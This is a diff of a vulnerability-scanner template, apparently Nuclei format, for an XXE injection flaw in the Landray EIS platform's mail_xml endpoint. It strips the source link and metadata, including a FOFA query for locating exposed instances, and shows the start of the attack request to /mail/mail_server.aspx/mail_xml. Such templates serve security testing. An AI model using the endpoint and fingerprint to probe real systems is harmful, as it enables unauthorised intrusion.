@@ -3,12 +3,8 @@ info:
   name: 蓝凌EIS智慧协同平台mail_xml存在XXE注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dmv7yogknvma844c'
+  description: ''
   tags: xxe,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dmv7yogknvma844c
-    fofa: body="/Scripts/jquery.landray.dialog.js"
 http:
 - raw:
   - 'POST /mail/mail_server.aspx/mail_xml?type=add HTTP/1.1
